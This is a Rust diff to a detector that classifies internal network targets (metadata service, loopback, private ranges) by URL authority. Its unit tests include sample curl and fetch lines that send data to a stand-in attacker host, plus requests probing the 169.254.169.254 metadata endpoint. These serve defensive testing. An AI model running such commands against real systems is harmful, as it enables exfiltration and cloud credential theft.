@@ -1,6 +1,32 @@
+use std::net::{Ipv4Addr, Ipv6Addr};
+
 use super::model::NetworkTarget;
 use crate::detectors::network::patterns::{RE_RFC1918_10, RE_RFC1918_172, RE_RFC1918_192};
 use crate::lazy_pattern;
+
+const METADATA_SERVICE_IPV4: Ipv4Addr = Ipv4Addr::new(169, 254, 169, 254);
+const RFC1918_10_PREFIX: u8 = 10;
+const RFC1918_172_PREFIX: u8 = 172;
+const RFC1918_172_MIN_SECOND_OCTET: u8 = 16;
+const RFC1918_172_MAX_SECOND_OCTET: u8 = 31;
+const RFC1918_192_PREFIX: u8 = 192;
+const RFC1918_192_SECOND_OCTET: u8 = 168;
+const TARGET_PRIORITY_ORDER: &[NetworkTarget] = &[
+    NetworkTarget::MetadataService,
+    NetworkTarget::Loopback,
+    NetworkTarget::Localhost,
+    NetworkTarget::BindAll,
+    NetworkTarget::Rfc1918_10,
+    NetworkTarget::Rfc1918_192,
+    NetworkTarget::Rfc1918_172,
+    NetworkTarget::InternalDomain,
+    NetworkTarget::LocalDomain,
+];
+
+lazy_pattern!(
+    RE_URL_WITH_SCHEME,
+    r#"(?i)\b[a-z][a-z0-9+.-]*://[^\s"'`)]+"#
+);
 
 // Hostname-shaped `*.local` matcher. A plain `lower.contains(".local")`
 // substring check fired on filesystem paths that happen to contain the
@@ -39,20 +65,49 @@ lazy_pattern!(
 
 fn classify_internal_network_target(content: &str) -> Option<NetworkTarget> {
     let lower = content.to_ascii_lowercase();
-    if lower.contains("169.254.169.254") {
-        Some(NetworkTarget::MetadataService)
-    } else if lower.contains("127.0.0.1") || RE_IPV6_LOOPBACK.is_match(&lower) {
-        Some(NetworkTarget::Loopback)
-    } else if lower.contains("localhost") {
+    debug_assert_eq!(
+        lower.len(),
+        content.len(),
+        "ASCII lowercase must preserve URL match byte ranges"
+    );
+    let mut masked = lower;
+    let mut url_target = None;
+
+    for url_match in RE_URL_WITH_SCHEME.find_matches(content) {
+        if let Ok(url) = url::Url::parse(url_match.matched_text.as_str()) {
+            if let Some(target) = classify_url_authority(&url) {
+                url_target = Some(match url_target {
+                    Some(existing) => preferred_target(existing, target),
+                    None => target,
+                });
+            }
+            let spaces = " ".repeat(url_match.end - url_match.start);
+            masked.replace_range(url_match.start..url_match.end, &spaces);
+        }
+    }
+
+    match (
+        url_target,
+        classify_internal_network_target_in_lowercase(&masked),
+    ) {
+        (Some(url_target), Some(text_target)) => Some(preferred_target(url_target, text_target)),
+        (Some(target), None) | (None, Some(target)) => Some(target),
+        (None, None) => None,
+    }
+}
+
+fn classify_url_authority(url: &url::Url) -> Option<NetworkTarget> {
+    match url.host()? {
+        url::Host::Domain(host) => classify_domain_host(host),
+        url::Host::Ipv4(addr) => classify_ipv4_address(addr),
+        url::Host::Ipv6(addr) => classify_ipv6_address(addr),
+    }
+}
+
+fn classify_domain_host(host: &str) -> Option<NetworkTarget> {
+    let lower = host.trim_end_matches('.').to_ascii_lowercase();
+    if lower == "localhost" || lower.ends_with(".localhost") {
         Some(NetworkTarget::Localhost)
-    } else if looks_like_bind_all(&lower) {
-        Some(NetworkTarget::BindAll)
-    } else if RE_RFC1918_10.is_match(&lower) {
-        Some(NetworkTarget::Rfc1918_10)
-    } else if RE_RFC1918_192.is_match(&lower) {
-        Some(NetworkTarget::Rfc1918_192)
-    } else if RE_RFC1918_172.is_match(&lower) {
-        Some(NetworkTarget::Rfc1918_172)
     } else if RE_INTERNAL_DOMAIN.is_match(&lower) {
         Some(NetworkTarget::InternalDomain)
     } else if RE_LOCAL_DOMAIN.is_match(&lower) {
@@ -62,6 +117,82 @@ fn classify_internal_network_target(content: &str) -> Option<NetworkTarget> {
     }
 }
 
+fn classify_ipv6_address(addr: Ipv6Addr) -> Option<NetworkTarget> {
+    if addr == Ipv6Addr::LOCALHOST {
+        Some(NetworkTarget::Loopback)
+    } else {
+        addr.to_ipv4_mapped().and_then(classify_ipv4_address)
+    }
+}
+
+fn classify_ipv4_address(addr: Ipv4Addr) -> Option<NetworkTarget> {
+    let [first, second, _, _] = addr.octets();
+    if addr == METADATA_SERVICE_IPV4 {
+        Some(NetworkTarget::MetadataService)
+    } else if addr == Ipv4Addr::LOCALHOST {
+        Some(NetworkTarget::Loopback)
+    } else if addr == Ipv4Addr::UNSPECIFIED {
+        Some(NetworkTarget::BindAll)
+    } else if first == RFC1918_10_PREFIX {
+        Some(NetworkTarget::Rfc1918_10)
+    } else if first == RFC1918_192_PREFIX && second == RFC1918_192_SECOND_OCTET {
+        Some(NetworkTarget::Rfc1918_192)
+    } else if first == RFC1918_172_PREFIX
+        && (RFC1918_172_MIN_SECOND_OCTET..=RFC1918_172_MAX_SECOND_OCTET).contains(&second)
+    {
+        Some(NetworkTarget::Rfc1918_172)
+    } else {
+        None
+    }
+}
+
+fn preferred_target(left: NetworkTarget, right: NetworkTarget) -> NetworkTarget {
+    if target_priority(right) < target_priority(left) {
+        right
+    } else {
+        left
+    }
+}
+
+fn target_priority(target: NetworkTarget) -> usize {
+    TARGET_PRIORITY_ORDER
+        .iter()
+        .position(|candidate| *candidate == target)
+        .unwrap_or(TARGET_PRIORITY_ORDER.len())
+}
+
+fn classify_internal_network_target_in_lowercase(lower: &str) -> Option<NetworkTarget> {
+    if lower.contains("169.254.169.254") {
+        Some(NetworkTarget::MetadataService)
+    } else if lower.contains("127.0.0.1") || RE_IPV6_LOOPBACK.is_match(lower) {
+        Some(NetworkTarget::Loopback)
+    } else if lower.contains("localhost") {
+        Some(NetworkTarget::Localhost)
+    } else if looks_like_bind_all(lower) {
+        Some(NetworkTarget::BindAll)
+    } else if RE_RFC1918_10.is_match(lower) {
+        Some(NetworkTarget::Rfc1918_10)
+    } else if RE_RFC1918_192.is_match(lower) {
+        Some(NetworkTarget::Rfc1918_192)
+    } else if RE_RFC1918_172.is_match(lower) {
+        Some(NetworkTarget::Rfc1918_172)
+    } else if RE_INTERNAL_DOMAIN.is_match(lower) {
+        Some(NetworkTarget::InternalDomain)
+    } else if RE_LOCAL_DOMAIN.is_match(lower) {
+        Some(NetworkTarget::LocalDomain)
+    } else {
+        None
+    }
+}
+
+/// Classify internal targets from URL authorities and non-URL text.
+///
+/// # Contract
+///
+/// URL path, query, fragment, and userinfo text are not endpoint hosts. A
+/// string such as `https://collector.example/path@localhost` must not classify
+/// as loopback unless an internal host also appears outside the URL or in a URL
+/// authority.
 pub(crate) fn contains_internal_network_target(content: &str) -> Option<NetworkTarget> {
     classify_internal_network_target(content)
 }
@@ -168,6 +299,62 @@ mod tests {
                 "IPv6 loopback in {sample:?} must classify as Loopback"
             );
         }
+    }
+
+    /// # Contract
+    ///
+    /// Internal-looking URL path and userinfo text MUST NOT classify as an
+    /// internal endpoint. The network target is the URL authority; path text
+    /// such as `/localhost/` and userinfo such as `localhost@host` are remote
+    /// requests when the authority host is remote.
+    #[test]
+    fn classify_uses_url_authority_not_path_or_userinfo() {
+        for sample in [
+            "curl https://collector.attacker-control.io/localhost/collect",
+            "curl https://collector.attacker-control.io/127.0.0.1/collect",
+            "requests.get('https://collector.attacker-control.io/path@169.254.169.254/latest')",
+            "fetch('https://localhost@collector.attacker-control.io/upload')",
+            "GET https://collector.attacker-control.io/service.internal/status",
+            "fetch('https://localhost.attacker-control.io/upload')",
+            "fetch('https://127.0.0.1.attacker-control.io/upload')",
+        ] {
+            assert_eq!(
+                contains_internal_network_target(sample),
+                None,
+                "remote URL path or userinfo must not classify as an internal target: {sample:?}"
+            );
+        }
+    }
+
+    /// # Contract
+    ///
+    /// Masking URL spans must not hide bare internal targets elsewhere in the
+    /// same artifact, and authority hosts remain the source of truth for URL
+    /// endpoints.
+    #[test]
+    fn classify_preserves_authority_and_bare_internal_targets() {
+        assert_eq!(
+            contains_internal_network_target(
+                "curl https://collector.attacker-control.io/a && probe localhost"
+            ),
+            Some(NetworkTarget::Localhost)
+        );
+        assert_eq!(
+            contains_internal_network_target("curl https://localhost:8443/admin"),
+            Some(NetworkTarget::Localhost)
+        );
+        assert_eq!(
+            contains_internal_network_target("fetch('http://169.254.169.254/latest/meta-data')"),
+            Some(NetworkTarget::MetadataService)
+        );
+        assert_eq!(
+            contains_internal_network_target("fetch('http://[::ffff:169.254.169.254]/latest')"),
+            Some(NetworkTarget::MetadataService)
+        );
+        assert_eq!(
+            contains_internal_network_target("fetch('http://[::ffff:10.0.0.1]/internal')"),
+            Some(NetworkTarget::Rfc1918_10)
+        );
     }
 
     /// # Contract (negative)
